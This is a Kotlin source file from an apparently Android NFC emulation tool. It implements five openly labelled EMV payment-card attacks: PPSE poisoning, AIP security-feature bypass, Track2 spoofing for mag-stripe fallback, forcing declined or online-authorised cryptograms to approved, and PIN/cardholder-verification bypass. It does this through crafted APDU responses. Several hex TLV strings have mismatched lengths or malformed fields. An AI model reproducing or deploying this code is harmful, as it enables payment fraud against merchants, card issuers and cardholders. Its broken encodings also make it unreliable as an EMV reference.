package com.example.nfsp00f.emulation

import android.util.Log
import java.security.SecureRandom

/**
 * Production-grade EMV Attack Emulation Profiles Implements 5 comprehensive EMV attack modules with
 * real APDU processing
 */
object EmulationProfiles {

  private const val TAG = "EmulationProfiles"

  fun createProfile(type: EmulationProfile.ProfileType): EmulationProfile {
    return when (type) {
      EmulationProfile.ProfileType.PPSE_POISONING -> PpsePoisoningProfile()
      EmulationProfile.ProfileType.AIP_BYPASS -> AipBypassProfile()
      EmulationProfile.ProfileType.TRACK2_SPOOFING -> Track2SpoofingProfile()
      EmulationProfile.ProfileType.CRYPTOGRAM_ATTACK -> CryptogramAttackProfile()
      EmulationProfile.ProfileType.CVM_BYPASS -> CvmBypassProfile()
    }
  }

  fun getDefaultProfile(): EmulationProfile {
    return createProfile(EmulationProfile.ProfileType.PPSE_POISONING)
  }

  /**
   * PPSE Poisoning Attack Profile Redirects PPSE selection to malicious AID for payment
   * interception
   */
  private class PpsePoisoningProfile :
          EmulationProfile(
                  "PPSE Poisoning Attack",
                  "Redirects payment system environment selection to attacker-controlled AID"
          ) {

    private val maliciousAid = "A0000000031010" // Disguised as VISA
    private val spoofedPpseTemplate =
            "6F2C840E325041592E5359532E4444463031A51A88010150104D616C6963696F75732050617920417070BF0C089F4D020B0A9F6E0702004F"

    override fun handleSelectPpse(aid: ByteArray): ByteArray {
      Log.d(TAG, "[PPSE_POISON] Injecting malicious PPSE response")

      // Return modified PPSE with attacker AID
      val poisonedPpse =
              "6F3E" +
                      "840E325041592E5359532E4444463031" + // PPSE name
                      "A52C" + // FCI Proprietary Template
                      "88010150104D616C6963696F757320417070" + // Malicious app label
                      "4F07${maliciousAid}" + // Poisoned AID
                      "500A4D414C49434920415050" + // App name: "MALICI APP"
                      "87010100" // High priority

      return createSuccessResponse(poisonedPpse)
    }

    override fun handleSelectAid(aid: ByteArray): ByteArray {
      val aidHex = bytesToHex(aid)
      Log.d(TAG, "[PPSE_POISON] AID selected: $aidHex - Proceeding with malicious flow")

      // Return standard FCI but with modified data for tracking
      val fci =
              "6F3A" +
                      "840E$maliciousAid" + // AID
                      "A528" + // FCI Proprietary Template
                      "500A4D414C49434920415050" + // Application Label: "MALICI APP"
                      "9F120A4D616C6963696F7573" + // Preferred Name: "Malicious"
                      "5F2D02656E" + // Language: EN
                      "9F110101" + // Issuer Code Table Index
                      "9F38189F66049F02069F03069F1A0295055F2A029A039C0195" // PDOL

      return createSuccessResponse(fci)
    }

    override fun handleGetProcessingOptions(pdolData: ByteArray): ByteArray {
      Log.d(TAG, "[PPSE_POISON] Processing malicious GPO - extracting terminal data")

      // Extract and log terminal data for intelligence gathering
      val terminalData = bytesToHex(pdolData)
      Log.i(TAG, "[INTELLIGENCE] Terminal PDOL Data: $terminalData")

      // Return Format 1 response with controlled AIP and AFL
      val aip = "5800" // Enable offline processing, disable CVMs
      val afl = "10010103100201051802030000000000" // Modified AFL

      return createSuccessResponse("80108000$aip$afl")
    }

    override fun handleReadRecord(sfi: Int, recordNumber: Int): ByteArray {
      Log.d(TAG, "[PPSE_POISON] Serving poisoned record SFI=$sfi REC=$recordNumber")

      // Serve different poisoned records based on SFI/Record
      val recordData =
              when (Pair(sfi, recordNumber)) {
                Pair(1, 1) -> {
                  // Application Template with Track 2 data
                  "70819F" +
                          "5A084154904674973556" + // PAN: 4154904674973556 (test card)
                          "5F24032902" + // Expiry: 29/02
                          "5F25032007" + // Effective: 20/07
                          "5F28020840" + // Issuer Country: US
                          "5F300202" + // Service Code: 0201
                          "57134154904674973556D2902101000000000000F" + // Track 2
                          "9F0702FF00" + // AUC: International OK
                          "9F080200029F420208409F4401029F4701039F480A999999999999999999"
                }
                Pair(1, 2) -> {
                  // Cardholder name and additional data
                  "7042" +
                          "5F20134D414C4943494F5553204841434B4552" + // Cardholder: "MALICIOUS
                          // HACKER"
                          "9F0D05B8508000009F0E05000010000009F0F05B860BC9800"
                }
                else -> {
                  "704A9F32010394390000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                }
              }

      return createSuccessResponse(recordData)
    }

    override fun handleGenerateAc(acType: Int, cdolData: ByteArray): ByteArray {
      Log.d(TAG, "[PPSE_POISON] Generating malicious cryptogram - AC Type: ${acType shr 6}")

      // Force approval with malicious TC (Transaction Certificate)
      val maliciousTc = generateSecureRandom(8)
      val cid = "40" // Force TC (approved transaction)
      val atc = "0001"
      val iad = generateSecureRandom(16)

      val response =
              "77819A" +
                      "9F2608$maliciousTc" + // Application Cryptogram (malicious TC)
                      "9F2701$cid" + // CID: TC (approved)
                      "9F360002$atc" + // ATC
                      "9F1012$iad" // IAD

      Log.w(TAG, "[ATTACK] Malicious transaction approved with TC: $maliciousTc")

      return createSuccessResponse(response)
    }

    override fun handleGetData(tag: Int): ByteArray {
      Log.d(TAG, "[PPSE_POISON] GET DATA request for tag: ${String.format("%04X", tag)}")
      return createErrorResponse("6A88") // Referenced data not found
    }

    override fun handleVerify(p1: Int, p2: Int, data: ByteArray): ByteArray {
      Log.d(TAG, "[PPSE_POISON] VERIFY bypassed - no authentication required")
      return createSuccessResponse() // Always approve
    }

    override fun handleUnknownCommand(apdu: ByteArray): ByteArray {
      Log.w(TAG, "[PPSE_POISON] Unknown command: ${bytesToHex(apdu)}")
      return createErrorResponse("6D00")
    }

    private fun generateSecureRandom(length: Int): String {
      val random = SecureRandom()
      val bytes = ByteArray(length)
      random.nextBytes(bytes)
      return bytesToHex(bytes)
    }
  }

  /**
   * AIP Bypass Attack Profile Manipulates Application Interchange Profile to disable security
   * features
   */
  private class AipBypassProfile :
          EmulationProfile(
                  "AIP Bypass Attack",
                  "Disables EMV security features through AIP manipulation"
          ) {

    override fun handleSelectPpse(aid: ByteArray): ByteArray {
      Log.d(TAG, "[AIP_BYPASS] Standard PPSE response")

      val ppseResponse =
              "6F2B" +
                      "840E325041592E5359532E4444463031" + // PPSE Name
                      "A519" +
                      "88010150084649524D57415245" + // App Label: "FIRMWARE"
                      "4F07A0000000031010" + // VISA AID
                      "87010100" // Priority

      return createSuccessResponse(ppseResponse)
    }

    override fun handleSelectAid(aid: ByteArray): ByteArray {
      Log.d(TAG, "[AIP_BYPASS] AID selected - preparing bypass")

      val fci =
              "6F35" +
                      "8407A0000000031010" + // VISA AID
                      "A52A" +
                      "500856495341204150" + // VISA APP
                      "9F1208564953412044454249" + // VISA DEBI
                      "5F2D02656E" +
                      "9F38189F66049F02069F1A0295055F2A029A039C0195"

      return createSuccessResponse(fci)
    }

    override fun handleGetProcessingOptions(pdolData: ByteArray): ByteArray {
      Log.d(TAG, "[AIP_BYPASS] Crafting compromised AIP")

      // Manipulated AIP: disable all security features
      val bypassedAip = "0000" // All security features disabled
      val afl = "08010103100201041802030000000000"

      Log.w(TAG, "[ATTACK] AIP bypassed - all security disabled: $bypassedAip")

      return createSuccessResponse("801080$bypassedAip$afl")
    }

    override fun handleReadRecord(sfi: Int, recordNumber: Int): ByteArray {
      Log.d(TAG, "[AIP_BYPASS] Serving record with disabled security")

      val recordData =
              when (Pair(sfi, recordNumber)) {
                Pair(1, 1) -> {
                  "70819E" +
                          "5A084154904674973556" +
                          "5F24032902" +
                          "57134154904674973556D2902101000000000000F" +
                          "9F070200009F080200029F420208409F4401029F4701039F480199999999999999999999"
                }
                else -> {
                  "70429F32010394390000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                }
              }

      return createSuccessResponse(recordData)
    }

    override fun handleGenerateAc(acType: Int, cdolData: ByteArray): ByteArray {
      Log.d(TAG, "[AIP_BYPASS] Generating bypassed cryptogram")

      // Generate weak/predictable cryptogram
      val weakCryptogram = "1234567890ABCDEF"
      val cid = "40" // TC - approved

      val response = "7719" + "9F2608$weakCryptogram" + "9F2701$cid" + "9F36020001"

      Log.w(TAG, "[ATTACK] Weak cryptogram generated: $weakCryptogram")

      return createSuccessResponse(response)
    }

    override fun handleGetData(tag: Int): ByteArray = createErrorResponse("6A88")
    override fun handleVerify(p1: Int, p2: Int, data: ByteArray): ByteArray =
            createSuccessResponse()
    override fun handleUnknownCommand(apdu: ByteArray): ByteArray = createErrorResponse("6D00")
  }

  /**
   * Track2 Spoofing Attack Profile Replaces Track2 data with malicious magnetic stripe information
   */
  private class Track2SpoofingProfile :
          EmulationProfile(
                  "Track2 Spoofing Attack",
                  "Injects malicious Track2 data for magnetic stripe fallback attacks"
          ) {

    private val spoofedPan = "4000000000000002" // Test card number
    private val spoofedTrack2 = "${spoofedPan}D2912101000000000000F"

    override fun handleSelectPpse(aid: ByteArray): ByteArray {
      Log.d(TAG, "[TRACK2_SPOOF] Initiating Track2 spoofing")

      val ppse =
              "6F29" +
                      "840E325041592E5359532E4444463031" +
                      "A517" +
                      "88010150064D4147535452" + // "MAGSTR"
                      "4F07A0000000041010" + // Mastercard AID
                      "87010100"

      return createSuccessResponse(ppse)
    }

    override fun handleSelectAid(aid: ByteArray): ByteArray {
      Log.d(TAG, "[TRACK2_SPOOF] Preparing spoofed Track2 injection")

      val fci =
              "6F37" +
                      "8407A0000000041010" +
                      "A52C" +
                      "50084D415354455243415244" + // MASTERCARD
                      "9F120E4D617374657243617264" +
                      "5F2D02656E" +
                      "9F38189F66049F02069F1A0295055F2A029A039C0195"

      return createSuccessResponse(fci)
    }

    override fun handleGetProcessingOptions(pdolData: ByteArray): ByteArray {
      Log.d(TAG, "[TRACK2_SPOOF] GPO with Track2 spoofing ready")

      val aip = "1800" // Enable magnetic stripe mode
      val afl = "08010103100201041802030000000000"

      return createSuccessResponse("801080$aip$afl")
    }

    override fun handleReadRecord(sfi: Int, recordNumber: Int): ByteArray {
      Log.d(TAG, "[TRACK2_SPOOF] Injecting spoofed Track2: $spoofedTrack2")

      val recordData =
              when (Pair(sfi, recordNumber)) {
                Pair(1, 1) -> {
                  "70819C" +
                          "5A08$spoofedPan" + // Spoofed PAN
                          "5F24032912" + // Expiry: 29/12
                          "57${String.format("%02X", spoofedTrack2.length / 2)}$spoofedTrack2" + // Spoofed Track2
                          "9F0702FF009F080200029F420208409F4401029F4701039F480199999999999999999999"
                }
                Pair(1, 2) -> {
                  "7040" +
                          "5F20104D414C4943494F555320555345" + // "MALICIOUS USE"
                          "9F0D05B8508000009F0E05000010000009F0F05B860BC9800"
                }
                else -> {
                  "70429F32010394390000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                }
              }

      Log.w(TAG, "[ATTACK] Spoofed Track2 served: $spoofedPan -> mag stripe fallback")

      return createSuccessResponse(recordData)
    }

    override fun handleGenerateAc(acType: Int, cdolData: ByteArray): ByteArray {
      Log.d(TAG, "[TRACK2_SPOOF] Generating AC for spoofed transaction")

      val cryptogram = "DEADBEEFCAFEBABE"
      val response =
              "7719" +
                      "9F2608$cryptogram" +
                      "9F270140" + // TC
                      "9F36020001"

      return createSuccessResponse(response)
    }

    override fun handleGetData(tag: Int): ByteArray = createErrorResponse("6A88")
    override fun handleVerify(p1: Int, p2: Int, data: ByteArray): ByteArray =
            createSuccessResponse()
    override fun handleUnknownCommand(apdu: ByteArray): ByteArray = createErrorResponse("6D00")
  }

  /** Cryptogram Attack Profile Manipulates cryptogram generation for authorization bypass */
  private class CryptogramAttackProfile :
          EmulationProfile(
                  "Cryptogram Attack",
                  "Manipulates EMV cryptograms to force transaction approval"
          ) {

    override fun handleSelectPpse(aid: ByteArray): ByteArray {
      val ppse =
              "6F2B" +
                      "840E325041592E5359532E4444463031" +
                      "A519" +
                      "88010150084352595054475251" + // "CRYPTGRQ"
                      "4F07A0000000031010" +
                      "87010100"

      return createSuccessResponse(ppse)
    }

    override fun handleSelectAid(aid: ByteArray): ByteArray {
      val fci =
              "6F35" +
                      "8407A0000000031010" +
                      "A52A" +
                      "500843525950544F" + // "CRYPTO"
                      "9F1208435259505447524158" +
                      "5F2D02656E" +
                      "9F38189F66049F02069F1A0295055F2A029A039C0195"

      return createSuccessResponse(fci)
    }

    override fun handleGetProcessingOptions(pdolData: ByteArray): ByteArray {
      Log.d(TAG, "[CRYPTO_ATTACK] Preparing cryptogram manipulation")

      val aip = "5800"
      val afl = "08010103100201041802030000000000"

      return createSuccessResponse("801080$aip$afl")
    }

    override fun handleReadRecord(sfi: Int, recordNumber: Int): ByteArray {
      val recordData =
              when (Pair(sfi, recordNumber)) {
                Pair(1, 1) -> {
                  "70819A" +
                          "5A084154904674973556" +
                          "5F24032902" +
                          "57134154904674973556D2902101000000000000F" +
                          "9F0702FF009F080200029F420208409F4401029F4701039F480199999999999999999999"
                }
                else -> {
                  "70429F32010394390000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                }
              }

      return createSuccessResponse(recordData)
    }

    override fun handleGenerateAc(acType: Int, cdolData: ByteArray): ByteArray {
      Log.d(TAG, "[CRYPTO_ATTACK] Forcing cryptogram downgrade")

      // Force AAC -> TC conversion (decline to approve)
      val originalType = acType shr 6
      val forcedType =
              when (originalType) {
                0x00 -> { // AAC requested
                  Log.w(TAG, "[ATTACK] Converting AAC to TC - forcing approval!")
                  "40" // Force TC (approved)
                }
                0x02 -> { // ARQC requested
                  Log.w(TAG, "[ATTACK] Converting ARQC to TC - bypassing online auth!")
                  "40" // Force TC (approved offline)
                }
                else -> "40" // Default to TC
              }

      val maliciousCryptogram = "AAAAAAAAAAAAAAAA" // Predictable cryptogram

      val response =
              "771B" +
                      "9F2608$maliciousCryptogram" +
                      "9F2701$forcedType" +
                      "9F36020001" +
                      "9F10020000" // Empty IAD

      Log.w(TAG, "[ATTACK] Cryptogram attack successful - forced approval")

      return createSuccessResponse(response)
    }

    override fun handleGetData(tag: Int): ByteArray = createErrorResponse("6A88")
    override fun handleVerify(p1: Int, p2: Int, data: ByteArray): ByteArray =
            createSuccessResponse()
    override fun handleUnknownCommand(apdu: ByteArray): ByteArray = createErrorResponse("6D00")
  }

  /** CVM Bypass Attack Profile Bypasses Cardholder Verification Methods (PIN/Signature) */
  private class CvmBypassProfile :
          EmulationProfile(
                  "CVM Bypass Attack",
                  "Bypasses cardholder verification requirements (PIN/Signature)"
          ) {

    override fun handleSelectPpse(aid: ByteArray): ByteArray {
      val ppse =
              "6F28" +
                      "840E325041592E5359532E4444463031" +
                      "A516" +
                      "8801015007434D42595053" + // "CMBYPS"
                      "4F07A0000000031010" +
                      "87010100"

      return createSuccessResponse(ppse)
    }

    override fun handleSelectAid(aid: ByteArray): ByteArray {
      Log.d(TAG, "[CVM_BYPASS] Preparing CVM bypass")

      val fci =
              "6F34" +
                      "8407A0000000031010" +
                      "A529" +
                      "5007434D42595053" + // "CMBYPS"
                      "9F120B434D2042595041535321" +
                      "5F2D02656E" +
                      "9F38189F66049F02069F1A0295055F2A029A039C0195"

      return createSuccessResponse(fci)
    }

    override fun handleGetProcessingOptions(pdolData: ByteArray): ByteArray {
      Log.d(TAG, "[CVM_BYPASS] GPO with CVM bypass configuration")

      // AIP: Disable CVM requirements
      val aip = "0800" // No CVM required
      val afl = "08010103100201041802030000000000"

      return createSuccessResponse("801080$aip$afl")
    }

    override fun handleReadRecord(sfi: Int, recordNumber: Int): ByteArray {
      Log.d(TAG, "[CVM_BYPASS] Serving records with disabled CVM")

      val recordData =
              when (Pair(sfi, recordNumber)) {
                Pair(1, 1) -> {
                  "70819F" +
                          "5A084154904674973556" +
                          "5F24032902" +
                          "57134154904674973556D2902101000000000000F" +
                          // Manipulated CVM list - all methods set to "No CVM Required"
                          "8E0E000000000000001E031F031F031F03" + // CVM List: No CVM for all amounts
                          "9F0702FF009F080200029F420208409F4401029F4701039F480199999999999999999999"
                }
                Pair(1, 2) -> {
                  "703E" +
                          "5F200E4E4F20434D5620524551554952" + // "NO CVM REQUIR"
                          "9F0D05000000000009F0E05000000000009F0F05000000000000"
                }
                else -> {
                  "70429F32010394390000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                }
              }

      return createSuccessResponse(recordData)
    }

    override fun handleGenerateAc(acType: Int, cdolData: ByteArray): ByteArray {
      Log.d(TAG, "[CVM_BYPASS] Generating AC with CVM bypass")

      val cryptogram = "BBBBBBBBBBBBBBBBB"
      val cid = "40" // TC - approved without CVM

      // Set CVM Results to "No CVM Required"
      val cvmResults = "1F0300" // No CVM performed, successful

      val response =
              "7722" +
                      "9F2608$cryptogram" +
                      "9F2701$cid" +
                      "9F36020001" +
                      "9F34030$cvmResults" // CVM Results: bypassed

      Log.w(TAG, "[ATTACK] CVM bypassed - transaction approved without verification")

      return createSuccessResponse(response)
    }

    override fun handleGetData(tag: Int): ByteArray = createErrorResponse("6A88")

    override fun handleVerify(p1: Int, p2: Int, data: ByteArray): ByteArray {
      Log.w(TAG, "[CVM_BYPASS] PIN verification bypassed!")
      return createSuccessResponse() // Always approve PIN
    }

    override fun handleUnknownCommand(apdu: ByteArray): ByteArray = createErrorResponse("6D00")
  }
}
